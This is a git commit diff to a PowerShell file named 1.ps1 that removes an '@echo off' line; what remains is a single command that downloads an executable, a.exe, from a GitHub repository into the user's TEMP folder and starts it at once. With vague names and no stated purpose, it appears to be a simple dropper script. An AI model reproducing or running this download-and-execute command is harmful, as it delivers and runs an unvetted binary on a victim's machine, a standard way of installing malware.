798f76b18c1fc8c10abb89142033960beb1d1cb3
frexoff <106326436+frexoff@users.noreply.github.com>
2024-06-12 20:28:50 +0300

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,3 +1,2 @@
-@echo off
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/frexoff/Something/raw/main/a.exe', \"$env:TEMP\a.exe\"); Start-Process \"$env:TEMP\a.exe\""
 exit
